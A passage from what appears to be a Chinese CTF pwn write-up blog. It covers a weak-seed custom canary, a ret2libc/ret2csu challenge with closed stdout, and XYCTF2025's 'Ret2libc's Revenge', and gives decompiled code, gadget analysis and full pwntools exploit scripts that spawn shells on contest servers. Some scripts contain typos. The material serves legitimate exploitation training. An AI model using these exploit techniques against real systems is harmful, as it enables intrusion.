        <content type="html"><![CDATA[<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><h3 id="复盘-ret2text-canary-伪随机数"><a href="#复盘-ret2text-canary-伪随机数" class="headerlink" title="复盘&#x2F;ret2text&#x2F;canary&#x2F;伪随机数"></a>复盘&#x2F;ret2text&#x2F;canary&#x2F;伪随机数</h3><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_401296();</span><br><span class="line">  sub_4013C7();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个函数分别如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_401296</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open /dev/urandom&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, &amp;qword_4040D0, <span class="number">8uLL</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand((v0 ^ qword_4040D0) &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__int64 <span class="title function_">sub_4013C7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  qword_4040D0 += rand();</span><br><span class="line">  v2 = qword_4040D0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a secret. Can you find it?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40135C();</span><br><span class="line">    v3 = sub_401397();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( qword_404088 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;My secret is %016lx\n&quot;</span>, qword_4040D0);</span><br><span class="line">          qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">          qword_4040D0 += rand();</span><br><span class="line">          v2 = qword_4040D0;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;But now, I have a new Secret.&quot;</span>);</span><br><span class="line">          --qword_404088;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Just one time!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Show me the code:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = qword_4040D0;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != qword_4040D0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey, What are you doing?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec发现并没有开启canary保护，看源码原来是自定义的随机字符串放在栈溢出的边缘模拟了canary机制，在sub_4013C7()函数返回前检查这个随机的字符串是否被修改。自然而然想到了泄露随机seed或是canary或者爆破canary。但是此题的seed无法直接泄露，但是可以爆破，笔者这里采取了不那么麻烦的做法。<br>canary在选项2直接给出，给出后马上实时更新了canary。既然实时更新，说明在更新前我们对canary的覆盖并不会造成影响，只需要溢出完成后更新一次就好了。即通过选项1来写ret2text，然后选项2更新canary，再通过选项3退出循环触发返回到system(“&#x2F;bin&#x2F;sh”);。需要注意的是，控制循环的变量也储存在栈上，需要注意覆盖为0确保写完ret2text后循环继续以便于更新canary。<br>至于爆破canary，我们先通过选项2泄露出canary，然后canary更新，这时我们有上一个canary，也就是这个随机序列的前两个随机数（题目用两个32位随机数移位合成一个64位canary）。那么我们便可以不断地从0到0xffffff尝试seed，然后用两个随机数合成一个64位值，若这个值和此前泄露的canary相等，说明我们找到了seed，这时更新的canary我们也就知道了。<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_Canary&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">sys_add=<span class="number">0x401581</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">0x14</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(sys_add)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>爆破做法的exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_Canary&#x27;</span>)</span><br><span class="line">cfun=cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">sys_add=<span class="number">0x401581</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;My secret is &#x27;</span>)</span><br><span class="line">target=r.recvline()</span><br><span class="line">canary=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffffff</span>):</span><br><span class="line">    cfun.srand(i)</span><br><span class="line">    temp=cfun.rand() &lt;&lt; <span class="number">32</span></span><br><span class="line">    temp+=cfun.rand()</span><br><span class="line">    temp=<span class="string">&quot;%016x&quot;</span> % temp <span class="comment">#将temp转为16字节长度的16进制字符串，因为泄露的canary也是这个格式</span></span><br><span class="line">    <span class="keyword">if</span> temp==target :</span><br><span class="line">        canary=cfun.rand() &lt;&lt; <span class="number">32</span></span><br><span class="line">        canary+=c.fun.rand()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6</span>+p32(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(sys_add)</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="复盘-ret2libc-重定向-ret2csu"><a href="#复盘-ret2libc-重定向-ret2csu" class="headerlink" title="复盘&#x2F;ret2libc&#x2F;重定向&#x2F;ret2csu"></a>复盘&#x2F;ret2libc&#x2F;重定向&#x2F;ret2csu</h3><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Close your eye, and you are blind now.&quot;</span>, <span class="number">0x26u</span>LL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuln函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的栈溢出但是禁用了标准输出，但是2没有禁用（标准错误输出），我们可以调用write函数传2为第一个参数(文件描述符2表示标准错误输出)来泄露libc<br>然后write函数有三个参数，第三个参数rdx的控制片段较难寻找。此题中rdx因为此前程序自身调用了read函数读入0x200，我们知道rdx已经是0x200，可以直接使用<br>尽管如此我们还是分析一下一种控制rdx，同时也能控制rdi和rsi的方法，称为ret2csu<br>一般程序中都存在<code>__libc_csu_init</code>这个函数。在这个函数中，有如下片段(以此题为例)：</p><p>gadget1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A0                 mov     rdx, r14</span><br><span class="line">.text:00000000004012A3                 mov     rsi, r13</span><br><span class="line">.text:00000000004012A6                 mov     edi, r12d</span><br><span class="line">.text:00000000004012A9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:00000000004012AD                 add     rbx, 1</span><br><span class="line">.text:00000000004012B1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012B4                 jnz     short loc_4012A0</span><br></pre></td></tr></table></figure><p>gadget2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012BA                 pop     rbx</span><br><span class="line">.text:00000000004012BB                 pop     rbp</span><br><span class="line">.text:00000000004012BC                 pop     r12</span><br><span class="line">.text:00000000004012BE                 pop     r13</span><br><span class="line">.text:00000000004012C0                 pop     r14</span><br><span class="line">.text:00000000004012C2                 pop     r15</span><br><span class="line">.text:00000000004012C4                 retn</span><br></pre></td></tr></table></figure><p>我们分析一下这两个片段就可以知道，通过<code>gadget2</code>中可传值的<code>r14,r13,r12</code>以及<code>gadget1</code>的前三条指令可以间接控制<code>rdx,rsi,edi</code><br><br>在<code>gadget2</code>中，我们call了 <code>[r15+rbx*8] </code>，将<code>rbx</code>置为0即 <code>[r15+rbx*8] == [r15]</code>，方便我们用<code>r15</code>控制调用的函数。<br>后续<code>add rbx, 1; cmp rbx, rbp; jnz xxxxxx</code>。我们已经令<code>rbx</code>&#x3D;0，从而使<code>r15+rbx*8=r15</code>，所以<code>add rbx,1</code>后<code>rbx=1</code>，若此时<code>rbp != 1</code>，<code>jnz</code>触发可能会产生错误，为了避免不必要的麻烦，我们令<code>rbp</code>也为1（<code>gadget2</code>可以控制<code>rbp</code>）。最后我们把目标函数地址传入<code>r15</code>，也就成功劫持了程序执行流。<br>除了这种通用的方法以外，还有一个巧妙的方法,<code>gadget2</code>中其实隐藏了两个简单的<code>gadget</code><br><code>pop r15;ret</code>的机器码转为16进制为(<code>0x41 0x5F 0xC3</code>)，而<code>pop rdi;ret</code>的机器码为(<code>0x5F 0xC3</code>),后两个字节一模一样，说明<code>pop r15;ret</code>指令可以通过控制指令开始的地址变为<code>pop rdi;ret</code>。以此题为例子，<code>pop r15</code>的地址是<code>0x4012C2</code>，那么<code>pop rdi</code>的地址是<code>pop r15</code>的地址加一，即<code>0x4012C3</code><br>同理我们看<code>pop r14</code>的机器码为（<code>0x41 0x5E</code>），而<code>pop rsi</code>的机器码正好为<code>0x5E</code>，以此题为例，<code>pop r14</code>的地址(<code>0x4012C0</code>)加一就是<code>pop rsi</code>指令的地址，也就是<code>0x4012C1</code>。<br>话说回来，继续分析这个题目，在用write函数泄露libc并getshell后，标准输入还是禁用状态，我们需要输入指令<code>exec 1&gt;&amp;0</code>，将标准输出重定向到标准输入，在执行这个命令后，进程的标准输出将不再向终端屏幕上显示，而是会将输出结果发送到标准输入。这意味着，后续的输出会被作为输入来处理。相当于重启了标准输出。还可以通过调用dup2函数来重定向（搬运的解释，以后学IO_FILE再看看）<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn importi*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./ywb_pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30003</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_add=<span class="number">0x401207</span></span><br><span class="line">pop_rdi=<span class="number">0x4012c3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4012c1</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main_add)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Close your eye, and you are blind now.&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_leak_add=u64(r.recv(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(write_leak_add))</span><br><span class="line">libcbase=write_leak_add-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ret2libc </category>
          
          <category> ret2csu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025</title>
      <link href="/2025/05/02/XYCTF2025/"/>
      <url>/2025/05/02/XYCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h2><h3 id="复现-ret2libc-全缓冲"><a href="#复现-ret2libc-全缓冲" class="headerlink" title="复现&#x2F;ret2libc&#x2F;全缓冲"></a>复现&#x2F;ret2libc&#x2F;全缓冲</h3><p>源码如下  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ret2libc&#x27;s Revenge&quot;</span>);</span><br><span class="line">  revenge();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">revenge</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">528</span>]; <span class="comment">// [rsp+0h] [rbp-220h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+210h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+217h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v6++;</span><br><span class="line">    v5 = v0;</span><br><span class="line">    v2[v0] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = v6;</span><br><span class="line">  v2[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为没有发现全缓冲，导致一直leak失败，其实其他思路都没有问题<br>打ret2libc，但是我们试运行程序时候发现当我们输入完之后才会输出Ret2libc’s Revenge，为什么？<br>原来setvbuf将stdout设置为了0，<strong>全缓冲模式，只有当输出缓冲区满了或者调用fflush函数才会输出内容</strong><br>我们这里没有fflush函数可以调用，于是只有填满缓冲区，我们找到text段的puts如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040128D                 lea     rdi, s          ; &quot;Ret2libc&#x27;s Revenge&quot;</span><br><span class="line">.text:0000000000401294                 call    _puts</span><br></pre></td></tr></table></figure><p>通过不断调用这一片段来不断填充输出缓冲区直至填满<br>注意我们构造payload时向栈中写入数据的索引v6也在栈上，当我们写入到v6的位置时，我们直接覆盖v6的低字节，以实现跳过。v6在rbp-4处，返回地址在rbp+8处，我们写入到v6时，v6为0x21c，我们写入一字节的0x28，将v6改为0x228，这样后续写入的字节便是直接从返回地址开始填充了<br>至于gadget的寻找，我们利用ROPgadget并没有找到可以直接控制rdi的片段，于是我们手动找到了可以间接控制rdi的片段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401180                 mov     rdi, rsi</span><br><span class="line">.text:0000000000401183                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004010EB                 add     rsi, [rbp+20h]</span><br><span class="line">.text:00000000004010EF                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004010E4                 and     rsi, 0</span><br><span class="line">.text:00000000004010E8                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040117D                 